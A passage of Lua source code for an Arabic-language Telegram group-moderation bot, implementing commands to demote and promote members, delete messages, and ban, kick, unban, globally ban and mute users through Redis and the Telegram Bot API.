KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم تنزيله من ↓\n✟︙{ "..sudo3..''..onall..''..moall..''..vpall..''..monsh..''..monsh2..''..owner..''..momod..''..vipmem.." } \n✟︙رتبته الان { عضو فقط }\n", 1, 'md')
else 
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙ يتم رفعه باي رتبه سابقا ، \n", 1, 'md')
end 
if fadx(msg.sender_user_id_,msg.chat_id_) == 'botow' then
KASPERdx1:srem(KASPER..'bot:admins:', result.sender_user_id_) KASPERdx1:srem(KASPER..'bot:onall:', result.sender_user_id_) 
KASPERdx1:srem(KASPER..'bot:moall:', result.sender_user_id_) KASPERdx1:srem(KASPER..'bot:vpall:', result.sender_user_id_)
KASPERdx1:srem(KASPER..'bot:monsh:'..msg.chat_id_,result.sender_user_id_) KASPERdx1:srem(KASPER..'bot:monsh2:'..msg.chat_id_,result.sender_user_id_) 
KASPERdx1:srem(KASPER..'bot:owners:'..msg.chat_id_, result.sender_user_id_) KASPERdx1:srem(KASPER..'bot:momod:'..msg.chat_id_, result.sender_user_id_)
KASPERdx1:srem(KASPER..'bot:vipmem:'..msg.chat_id_, result.sender_user_id_)
elseif fadx(msg.sender_user_id_,msg.chat_id_) == 'sudo3' then
KASPERdx1:srem(KASPER..'bot:onall:', result.sender_user_id_) KASPERdx1:srem(KASPER..'bot:moall:', result.sender_user_id_) KASPERdx1:srem(KASPER..'bot:vpall:', result.sender_user_id_)
KASPERdx1:srem(KASPER..'bot:momod:'..msg.chat_id_, result.sender_user_id_) KASPERdx1:srem(KASPER..'bot:vipmem:'..msg.chat_id_, result.sender_user_id_) 
KASPERdx1:srem(KASPER..'bot:owners:'..msg.chat_id_, result.sender_user_id_)  KASPERdx1:srem(KASPER..'bot:monsh2:'..msg.chat_id_,result.sender_user_id_) 
KASPERdx1:srem(KASPER..'bot:monsh:'..msg.chat_id_,result.sender_user_id_)
elseif fadx(msg.sender_user_id_,msg.chat_id_) == 'monsh' then
KASPERdx1:srem(KASPER..'bot:momod:'..msg.chat_id_, result.sender_user_id_) KASPERdx1:srem(KASPER..'bot:vipmem:'..msg.chat_id_, result.sender_user_id_)
KASPERdx1:srem(KASPER..'bot:owners:'..msg.chat_id_, result.sender_user_id_) KASPERdx1:srem(KASPER..'bot:monsh2:'..msg.chat_id_,result.sender_user_id_)
elseif fadx(msg.sender_user_id_,msg.chat_id_) == 'monsh2' then
KASPERdx1:srem(KASPER..'bot:momod:'..msg.chat_id_, result.sender_user_id_) KASPERdx1:srem(KASPER..'bot:vipmem:'..msg.chat_id_, result.sender_user_id_)
KASPERdx1:srem(KASPER..'bot:owners:'..msg.chat_id_, result.sender_user_id_)
elseif fadx(msg.sender_user_id_,msg.chat_id_) == 'owner' then
KASPERdx1:srem(KASPER..'bot:momod:'..msg.chat_id_, result.sender_user_id_) KASPERdx1:srem(KASPER..'bot:vipmem:'..msg.chat_id_, result.sender_user_id_)
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end 
--     By Developer KASPER     -- 
if text and text:match("^تنزيل الكل @(.*)$") and is_owner(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then
local rem = {string.match(text, "^(تنزيل الكل) @(.*)$")}
function remm(extra, result, success)
if result.id_ then
if is_leaderid(result.id_) == true then
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙لا يمكنك تنزيل المطور الاساسي ", 1, 'md')
return false 
end
if KASPERdx1:sismember(KASPER..'bot:admins:',result.id_) then
sudo3 = 'مطور ثالث ، ' else sudo3 = '' end
if KASPERdx1:sismember(KASPER..'bot:onall:',result.id_) then
onall = 'مدير عام ، ' else onall = '' end
if KASPERdx1:sismember(KASPER..'bot:moall:',result.id_) then
moall = 'ادمن عام ، ' else moall = '' end
if KASPERdx1:sismember(KASPER..'bot:vpall:',result.id_) then
vpall = 'مميز عام ، ' else vpall = '' end
if KASPERdx1:sismember(KASPER..'bot:monsh:'..msg.chat_id_, result.id_) then
monsh = 'منشئ اساسي ،  ' else monsh = '' end
if KASPERdx1:sismember(KASPER..'bot:monsh2:'..msg.chat_id_, result.id_) then
monsh2 = 'منشئ ، ' else monsh2 = '' end 
if KASPERdx1:sismember(KASPER..'bot:owners:'..msg.chat_id_, result.id_) then
owner = 'مدير ، ' else owner = '' end
if KASPERdx1:sismember(KASPER..'bot:momod:'..msg.chat_id_, result.id_) then
momod = 'ادمن ، ' else momod = '' end
if KASPERdx1:sismember(KASPER..'bot:vipmem:'..msg.chat_id_, result.id_) then
vipmem = 'مميز' else vipmem = ''
end
if dxdx(result.id_,msg.chat_id_) ~= false then
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم تنزيله من ↓\n✟︙{ "..sudo3..''..onall..''..moall..''..vpall..''..monsh..''..monsh2..''..owner..''..momod..''..vipmem.." } \n✟︙رتبته الان { عضو فقط }\n", 1, 'md')
else 
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙ يتم رفعه باي رتبه سابقا ، \n", 1, 'md')
end 
if fadx(msg.sender_user_id_,msg.chat_id_) == 'botow' then
KASPERdx1:srem(KASPER..'bot:admins:', result.id_) KASPERdx1:srem(KASPER..'bot:onall:', result.id_)
KASPERdx1:srem(KASPER..'bot:moall:', result.id_) KASPERdx1:srem(KASPER..'bot:vpall:', result.id_)
KASPERdx1:srem(KASPER..'bot:monsh:'..msg.chat_id_,result.id_) KASPERdx1:srem(KASPER..'bot:monsh2:'..msg.chat_id_,result.id_)
KASPERdx1:srem(KASPER..'bot:owners:'..msg.chat_id_, result.id_) KASPERdx1:srem(KASPER..'bot:momod:'..msg.chat_id_, result.id_)
KASPERdx1:srem(KASPER..'bot:vipmem:'..msg.chat_id_, result.id_)
elseif fadx(msg.sender_user_id_,msg.chat_id_) == 'sudo3' then
KASPERdx1:srem(KASPER..'bot:onall:', result.id_) KASPERdx1:srem(KASPER..'bot:moall:', result.id_)
KASPERdx1:srem(KASPER..'bot:vpall:', result.id_) KASPERdx1:srem(KASPER..'bot:momod:'..msg.chat_id_, result.id_)
KASPERdx1:srem(KASPER..'bot:vipmem:'..msg.chat_id_, result.id_) KASPERdx1:srem(KASPER..'bot:owners:'..msg.chat_id_, result.id_)
KASPERdx1:srem(KASPER..'bot:monsh2:'..msg.chat_id_,result.id_) KASPERdx1:srem(KASPER..'bot:monsh:'..msg.chat_id_,result.id_)
elseif fadx(msg.sender_user_id_,msg.chat_id_) == 'monsh' then
KASPERdx1:srem(KASPER..'bot:momod:'..msg.chat_id_, result.id_) KASPERdx1:srem(KASPER..'bot:vipmem:'..msg.chat_id_, result.id_)
KASPERdx1:srem(KASPER..'bot:owners:'..msg.chat_id_, result.id_) KASPERdx1:srem(KASPER..'bot:monsh2:'..msg.chat_id_,result.id_)
elseif fadx(msg.sender_user_id_,msg.chat_id_) == 'monsh2' then
KASPERdx1:srem(KASPER..'bot:momod:'..msg.chat_id_, result.id_) KASPERdx1:srem(KASPER..'bot:vipmem:'..msg.chat_id_, result.id_)
KASPERdx1:srem(KASPER..'bot:owners:'..msg.chat_id_, result.id_)
elseif fadx(msg.sender_user_id_,msg.chat_id_) == 'owner' then
KASPERdx1:srem(KASPER..'bot:momod:'..msg.chat_id_, result.id_) KASPERdx1:srem(KASPER..'bot:vipmem:'..msg.chat_id_, result.id_)
end
Fsend = '✟︙المعرف غير صحيح*'
send(msg.chat_id_, msg.id_, 1, Fsend, 1, 'md')
end end
resolve_username(rem[2],remm)
end 
--     By Developer KASPER     -- 
if text:match("^رفع ادمن بالكروب$")  and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ and KASPER11(msg) then
function promote_by_reply(extra, result, success)
local user_info_ = KASPERdx1:get(KASPER..'user:Name' .. result.sender_user_id_)
local KASPER_res = user_info_
if user_info_ then
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=false")
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙*العضو* ( ['..KASPER_res..'] )\n✟︙*تم رفعه ( ادمن بالكروب ) *\n✟︙*بواسطه ( '..renk_KASPER(msg)..' )*', 1, 'md')
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text:match("^تنزيل ادمن بالكروب$")  and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ and KASPER11(msg) then
function promote_by_reply(extra, result, success)
local user_info_ = KASPERdx1:get(KASPER..'user:Name' .. result.sender_user_id_)
local KASPER_res = user_info_
if user_info_ then
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙*ادمن الكروب* ( ['..KASPER_res..'] )\n✟︙*تم تنزيله ( عضو ) *\n✟︙*بواسطه ( '..renk_KASPER(msg)..' )*', 1, 'md')
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end 
if text:match("^رفع بكل الصلاحيات$")  and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ and KASPER11(msg) then
function promote_by_reply(extra, result, success)
local user_info_ = KASPERdx1:get(KASPER..'user:Name' .. result.sender_user_id_)
local KASPER_res = user_info_
if user_info_ then
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙*العضو* ( ['..KASPER_res..'] )\n✟︙*بواسطه ( '..renk_KASPER(msg)..' )*\n✟︙*تم رفعه ( ادمن بالكروب بكل الصلاحيات )\n✟︙صلاحياته الان \n✟︙تغيير اسم المجموعه \n✟︙حذف الرسائل \n✟︙الدعوه بالرابط \n✟︙تثبيت الرسائل \n✟︙اضافه مشرفين *', 1, 'md')
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text:match("^الغاء خاصيه تغيير الاسم$")  and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ and KASPER11(msg) then
function promote_by_reply(extra, result, success)
local user_info_ = KASPERdx1:get(KASPER..'user:Name' .. result.sender_user_id_)
local KASPER_res = user_info_ 
if user_info_ then
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=false")
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙*العضو* ( ['..KASPER_res..'] )\n✟︙*بواسطه ( '..renk_KASPER(msg)..' )*\n✟︙*تم الغاء ( خاصيه تغيير الاسم )\n✟︙صلاحياته الان \n✟︙حذف الرسائل \n✟︙الدعوه بالرابط \n✟︙تثبيت الرسائل*', 1, 'md')
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text:match("^الغاء خاصيه التثبيت$")  and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ and KASPER11(msg) then
function promote_by_reply(extra, result, success)
local user_info_ = KASPERdx1:get(KASPER..'user:Name' .. result.sender_user_id_)
local KASPER_res = user_info_ 
if user_info_ then
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=false&can_promote_members=false")
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙*العضو* ( ['..KASPER_res..'] )\n✟︙*بواسطه ( '..renk_KASPER(msg)..' )*\n✟︙*تم الغاء ( خاصيه التثبيت )\n✟︙صلاحياته الان \n✟︙حذف الرسائل \n✟︙الدعوه بالرابط *', 1, 'md')
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
--     By Developer KASPER     -- 
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Dd]el$") or text:match("^مسح$") and msg.reply_to_message_id_ ~= 0 and KASPER11(msg) then
local id = msg.id_
local msgs = {[0] = id}
delete_msg(msg.chat_id_,{[0] = msg.reply_to_message_id_})
delete_msg(msg.chat_id_,msgs)
end
if is_monsh(msg.sender_user_id_, msg.chat_id_) then
if text:match("^تفعيل الحظر$") or text:match("^تفعيل الطرد$") and KASPER11(msg) then
KASPERdx1:del("KASPER:lock:ban"..bot_id..msg.chat_id_)
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙ تم تفعيل الحظر ، ', 1, 'md')
end
if text:match("^تعطيل الحظر$") or text:match("^تعطيل الطرد$") and is_monsh(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then
KASPERdx1:set("KASPER:lock:ban"..bot_id..msg.chat_id_,"KASPER")
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙ تم تعطيل الحظر ، ', 1, 'md')
end
if text:match("^تفعيل الكتم$") and KASPER11(msg) or text:match("^تفعيل التقييد$") and KASPER11(msg) then
KASPERdx1:del("KASPER:lock:banmu"..bot_id..msg.chat_id_)
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙ تم تفعيل الكتم ، ', 1, 'md')
end
if text:match("^تعطيل الكتم$") and KASPER11(msg) or text:match("^تعطيل التقييد$") and KASPER11(msg) then
KASPERdx1:set("KASPER:lock:banmu"..bot_id..msg.chat_id_,"KASPER")
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙ تم تعطيل الكتم ، ', 1, 'md')
end end 
--     By Developer KASPER     -- 
if text:match("^حظر$") and msg.reply_to_message_id_ ~= 0 and is_momod(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then
function ban_by_reply(extra, result, success)
if not is_monsh(msg.sender_user_id_, msg.chat_id_) and KASPERdx1:get("KASPER:lock:ban"..bot_id..msg.chat_id_) then 
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙لا تستطيع الطرد او الحظر ، \n✟︙لانه معطل من قبل المنشئ . ', 1, 'md')
return "KASPER"
end
local KASPER = 'bot:banned:'..msg.chat_id_
if is_momod(result.sender_user_id_, result.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙لا تستطيع حظر ، '..KASPER_renk(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
if KASPERdx1:sismember(KASPER..KASPER, result.sender_user_id_) then
Send_Options(msg,result.sender_user_id_,"reply","✟︙بواسطه ، "..renk_KASPER(msg).."\n✟︙تم حظره سابقا𓍢\n")
chat_kick(result.chat_id_, result.sender_user_id_)
else
KASPERdx1:sadd(KASPER..KASPER, result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","✟︙بواسطه ، "..renk_KASPER(msg).."\n✟︙تم حظره بنجاح𓍢\n")
chat_kick(result.chat_id_, result.sender_user_id_)
end end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,ban_by_reply)
end  
--     By Developer KASPER     -- 
if text:match('^حظر @(.*)$') and is_momod(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then
local KASPER_res = {string.match(text, '^(حظر) @(.*)$')}
function ban_by_username(extra, result, success)
if not is_monsh(msg.sender_user_id_, msg.chat_id_) and KASPERdx1:get("KASPER:lock:ban"..bot_id..msg.chat_id_) then 
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙لا تستطيع الطرد او الحظر ، \n✟︙لانه معطل من قبل المنشئ . ', 1, 'md')
return "KASPER"
end
local KASPER = 'bot:banned:'..msg.chat_id_
if result.id_ then 
if is_momod(result.id_, msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙لا تستطيع حظر ، '..KASPER_renk(result.id_, msg.chat_id_), 1, 'md')
else
if KASPERdx1:sismember(KASPER..KASPER, result.id_) then
Send_Options(msg,result.id_,"reply","✟︙بواسطه ، "..renk_KASPER(msg).."\n✟︙تم حظره سابقا𓍢\n")
else
KASPERdx1:sadd(KASPER..KASPER, result.id_)
Send_Options(msg,result.id_,"reply","✟︙بواسطه ، "..renk_KASPER(msg).."\n✟︙تم حظره بنجاح𓍢\n")
chat_kick(msg.chat_id_, result.id_)
end end end end
resolve_username(KASPER_res[2],ban_by_username)
end
--     By Developer KASPER     -- 
if text:match("^حظر (%d+)$") and is_momod(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then
local res = {string.match(text, "^(حظر) (%d+)$")}
if not is_monsh(msg.sender_user_id_, msg.chat_id_) and KASPERdx1:get("KASPER:lock:ban"..bot_id..msg.chat_id_) then 
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙لا تستطيع الطرد او الحظر ، \n✟︙لانه معطل من قبل المنشئ . ', 1, 'md')
return "KASPER"
end
local user_info_ = KASPERdx1:get(KASPER..'user:Name' .. res[2])
local KASPER_res = user_info_ if user_info_ then
if is_momod(res[2], msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙لا تستطيع حظر ، '..KASPER_renk(res[2], msg.chat_id_), 1, 'md')
else
KASPERdx1:sadd(KASPER..'bot:banned:'..msg.chat_id_, res[2])
chat_kick(msg.chat_id_, res[2])
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙*العضو* ( ['..KASPER_res..'] )\n✟︙*بواسطه ( '..renk_KASPER(msg)..' )*\n✟︙*تم ( حظره ) من المجموعه ،*', 1, 'md')
end end end
--     By Developer KASPER     -- 
if text:match("^طرد$") and msg.reply_to_message_id_ ~= 0 and is_momod(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then
function kick_reply(extra, result, success)
if not is_monsh(msg.sender_user_id_, msg.chat_id_) and KASPERdx1:get("KASPER:lock:ban"..bot_id..msg.chat_id_) then 
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙لا تستطيع الطرد او الحظر ، \n✟︙لانه معطل من قبل المنشئ . ', 1, 'md')
return "KASPER"
end
if is_momod(result.sender_user_id_, result.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙لا تستطيع طرد ، '..KASPER_renk(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
Send_Options(msg,result.sender_user_id_,"reply","✟︙بواسطه ، "..renk_KASPER(msg).."\n✟︙تم طرده بنجاح𓍢\n")
chat_kick(result.chat_id_, result.sender_user_id_)
end end
getMessage(msg.chat_id_,msg.reply_to_message_id_,kick_reply)
end
--     By Developer KASPER     -- 
if text and text:match("^طرد @(.*)$") and is_momod(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then
local KASPER_res = {string.match(text, "^(طرد) @(.*)$")}
function ban_by_username(extra, result, success)
if not is_monsh(msg.sender_user_id_, msg.chat_id_) and KASPERdx1:get("KASPER:lock:ban"..bot_id..msg.chat_id_) then 
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙لا تستطيع الطرد او الحظر ، \n✟︙لانه معطل من قبل المنشئ . ', 1, 'md')
return "KASPER"
end
if result.id_ then
if is_momod(result.id_, msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙لا تستطيع طرد ، '..KASPER_renk(result.id_, msg.chat_id_), 1, 'md')
else
Send_Options(msg,result.id_,"reply","✟︙بواسطه ، "..renk_KASPER(msg).."\n✟︙تم طرده بنجاح𓍢\n")
chat_kick(msg.chat_id_, result.id_)
end end end
resolve_username(KASPER_res[2],ban_by_username)
end
--     By Developer KASPER     -- 
if text:match("^طرد (%d+)$") and is_momod(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then
local res = {string.match(text, "^(طرد) (%d+)$")}
if not is_monsh(msg.sender_user_id_, msg.chat_id_) and KASPERdx1:get("KASPER:lock:ban"..bot_id..msg.chat_id_) then 
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙لا تستطيع الطرد او الحظر ، \n✟︙لانه معطل من قبل المنشئ . ', 1, 'md')
return "KASPER"
end
local user_info_ = KASPERdx1:get(KASPER..'user:Name' .. res[2])
local KASPER_res = user_info_ if user_info_ then
if is_momod(res[2], msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙لا تستطيع طرد ، '..KASPER_renk(res[2], msg.chat_id_), 1, 'md')
else
chat_kick(msg.chat_id_, res[2])
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙*العضو* ( ['..KASPER_res..'] )\n✟︙*بواسطه ( '..renk_KASPER(msg)..' )*\n✟︙*تم ( طرده ) من المجموعه ،*', 1, 'md')
end end end
--     By Developer KASPER     -- 
if text:match("^الغاء حظر$") and msg.reply_to_message_id_ ~= 0 and is_momod(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then
function KASPER(extra, result, success)
function unban_by_reply(extra, result, success)
local KASPER = 'bot:banned:'..msg.chat_id_
if not KASPERdx1:sismember(KASPER..KASPER, result.sender_user_id_) then
Send_Options(msg,result.sender_user_id_,"reply","✟︙بواسطه ، "..renk_KASPER(msg).."\n✟︙لم يتم حظره سابقا𓍢\n")
else  
KASPERdx1:srem(KASPER..KASPER, result.sender_user_id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
Send_Options(msg,result.sender_user_id_,"reply","✟︙بواسطه ، "..renk_KASPER(msg).."\n✟︙تم الغاء حظره𓍢\n")
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,unban_by_reply)
end
channel_get_kicked(msg.chat_id_,KASPER)
end 
--     By Developer KASPER     -- 
if text:match("^الغاء حظر @(.*)$") and is_momod(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then
local res = {string.match(text, "^(الغاء حظر) @(.*)$")}
function unban_by_username(extra, result, success)
if result.id_ then
if not KASPERdx1:sismember(KASPER..'bot:banned:'..msg.chat_id_, result.id_) then
Send_Options(msg,result.id_,"reply","✟︙بواسطه ، "..renk_KASPER(msg).."\n✟︙لم يتم حظره سابقا𓍢\n")
else 
KASPERdx1:srem(KASPER..'bot:banned:'..msg.chat_id_, result.id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)
Send_Options(msg,result.id_,"reply","✟︙بواسطه ، "..renk_KASPER(msg).."\n✟︙تم الغاء حظره𓍢\n")
end else 
text = '✟︙*المعرف غير صحيح*'
end
KASPERdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
resolve_username(res[2],unban_by_username)
end
--     By Developer KASPER     -- 
if text:match("^الغاء حظر (%d+)$") and is_momod(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then
local res = {string.match(text, "^(الغاء حظر) (%d+)$")}
local user_info_ = KASPERdx1:get(KASPER..'user:Name' .. res[2])
local KASPER_res = user_info_ if user_info_ then
if not KASPERdx1:sismember(KASPER..'bot:banned:'..msg.chat_id_, res[2]) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙*العضو* ( ['..KASPER_res..'] )\n✟︙*بواسطه ( '..renk_KASPER(msg)..' )*\n✟︙*لم يتم ( حظره ) سابقا*', 1, 'md')
else 
KASPERdx1:srem(KASPER..'bot:banned:'..msg.chat_id_, res[2])
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = res[2] , status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙*المحظور* ( ['..KASPER_res..'] )\n✟︙*بواسطه ( '..renk_KASPER(msg)..' )*\n✟︙*تم ( الغاء حظره ) ،*', 1, 'md')
end end end
--     By Developer KASPER     -- 
if text:match("^حظر عام$") and is_sudo(msg) and msg.reply_to_message_id_ and KASPER11(msg) then
function gban_by_reply(extra, result, success)
local gps = KASPERdx1:scard(KASPER.."bot:groups")
local KASPER = 'bot:gban:'
if is_leaderid(result.sender_user_id_) == true then
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙*لا تستطيع حظر المطور الاساسي ،*", 1, 'md')
return false 
end
Send_Options(msg,result.sender_user_id_,"reply","✟︙بواسطه ، "..renk_KASPER(msg).."\n✟︙تم حظره من "..gps.." مجموعه𓍢\n")
KASPERdx1:sadd(KASPER..KASPER, result.sender_user_id_)
chat_kick(result.chat_id_, result.sender_user_id_)
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,gban_by_reply)
end
--     By Developer KASPER     -- 
if text and text:match("^حظر عام @(.*)$") and is_sudo(msg) and KASPER11(msg) then
local KASPER_res = {string.match(text, "^(حظر عام) @(.*)$")}
local gps = KASPERdx1:scard(KASPER.."bot:groups")
function gban_by_username(extra, result, success)
if result.id_ then
if is_leaderid(result.id_) == true then
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙*لا تستطيع حظر المطور الاساسي ،*", 1, 'md')
return false 
end
Send_Options(msg,result.id_,"reply","✟︙بواسطه ، "..renk_KASPER(msg).."\n✟︙تم حظره من "..gps.." مجموعه𓍢\n")
KASPERdx1:sadd(KASPER..'bot:gban:', result.id_)
chat_kick(msg.chat_id_, result.id_)
end end
resolve_username(KASPER_res[2],gban_by_username)
end
--     By Developer KASPER     -- 
if text:match("^حظر عام (%d+)$") and is_sudo(msg) and KASPER11(msg) then
local res = {string.match(text, "^(حظر عام) (%d+)$")}
local gps = KASPERdx1:scard(KASPER.."bot:groups")
local user_info_ = KASPERdx1:get(KASPER..'user:Name' .. res[2])
local KASPER = 'bot:gban:'
local KASPER_res = user_info_ if user_info_ then
if is_leaderid(res[2]) == true then
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙*لا تستطيع حظر المطور الاساسي ،*", 1, 'md')
return false 
end
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙*العضو* ( ['..KASPER_res..'] )\n✟︙*بواسطه ( '..renk_KASPER(msg)..' )*\n✟︙*تم حظره من ( '..gps..' ) مجموعه*', 1, 'md')
end
KASPERdx1:sadd(KASPER..KASPER, res[2])
chat_kick(msg.chat_id_, res[2])
end
--     By Developer KASPER     -- 
if text:match("^الغاء العام$") and is_sudo(msg) and msg.reply_to_message_id_ and KASPER11(msg) then
function ungban_by_reply(extra, result, success)
local gps = KASPERdx1:scard(KASPER.."bot:groups")
local user_info_ = KASPERdx1:get(KASPER..'user:Name' .. result.sender_user_id_)
local KASPER_res = user_info_ if user_info_ then
Send_Options(msg,result.sender_user_id_,"reply","✟︙بواسطه ، "..renk_KASPER(msg).."\n✟︙تم الغاء حظره ، كتمه من "..gps.." مجموعه𓍢\n")
end
KASPERdx1:srem(KASPER..'bot:gban:', result.sender_user_id_)
KASPERdx1:srem(KASPER..'bot:mutedall:', result.sender_user_id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,ungban_by_reply)
end
--     By Developer KASPER     -- 
if text:match("^الغاء العام @(.*)$") and is_sudo(msg) and KASPER11(msg) then
local KASPER_res = {string.match(text, "^(الغاء العام) @(.*)$")}
local gps = KASPERdx1:scard(KASPER.."bot:groups")
function ungban_by_username(extra, result, success)
if result.id_ then
Send_Options(msg,result.id_,"reply","✟︙بواسطه ، "..renk_KASPER(msg).."\n✟︙تم الغاء حظره ، كتمه من "..gps.." مجموعه𓍢\n")
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)
KASPERdx1:srem(KASPER..'bot:gban:', result.id_)
KASPERdx1:srem(KASPER..'bot:mutedall:', result.id_)
end end 
resolve_username(KASPER_res[2],ungban_by_username)
end
--     By Developer KASPER     -- 
if text:match("^الغاء العام (%d+)$") and is_sudo(msg) and KASPER11(msg) then
local res = {string.match(text, "^(الغاء العام) (%d+)$")}
local gps = KASPERdx1:scard(KASPER.."bot:groups")
local user_info_ = KASPERdx1:get(KASPER..'user:Name' .. res[2])
local KASPER_res = user_info_ if user_info_ then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙*العضو* ( ['..KASPER_res..'] )\n✟︙*بواسطه ( '..renk_KASPER(msg)..' )*\n✟︙*تم الغاء حظره ، كتمه من ( '..gps..' ) مجموعه*', 1, 'md')
KASPERdx1:srem(KASPER..'bot:gban:', res[2])
KASPERdx1:srem(KASPER..'bot:mutedall:', res[2])
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = ap[2] , status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
end end
--     By Developer KASPER     -- 
if text:match("^كتم عام$") and is_sudo(msg) and msg.reply_to_message_id_ and KASPER11(msg) then
function muteall_by_reply(extra, result, success)
local gps = KASPERdx1:scard(KASPER.."bot:groups")
local user_info_ = KASPERdx1:get(KASPER..'user:Name' .. result.sender_user_id_)
local KASPER_res = user_info_ if user_info_ then
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
KASPERdx(msg.chat_id_, msg.id_, 1, '•*لا تستطيع كتمي*', 1, 'md')
return false 
end 
